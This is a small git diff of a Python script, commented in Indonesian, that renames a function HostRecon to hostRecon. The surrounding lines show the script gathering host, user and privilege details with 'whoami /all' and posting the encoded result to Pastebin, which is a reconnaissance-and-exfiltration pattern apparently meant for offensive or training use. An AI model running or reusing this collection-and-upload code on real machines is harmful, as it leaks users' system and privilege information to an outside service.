@@ -5,7 +5,7 @@ import base64, sys
 from subprocess import PIPE, Popen
 from requests.api import post
 
-def HostRecon():
+def hostRecon():
     # mengumpulkan informasi mengenai Hostname, User yang login, dan Current Privileges
     process = Popen("whoami /all", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
     result, err = process.communicate()
@@ -44,5 +44,5 @@ def pastebin_create_paste(encoded_data):
 
 if __name__ == "__main__":
     # melakukan Host Reconnaissance kemudian membuat paste pada pastebin
-    host_encoded_data = HostRecon()
+    host_encoded_data = hostRecon()
     pastebin_create_paste(host_encoded_data)
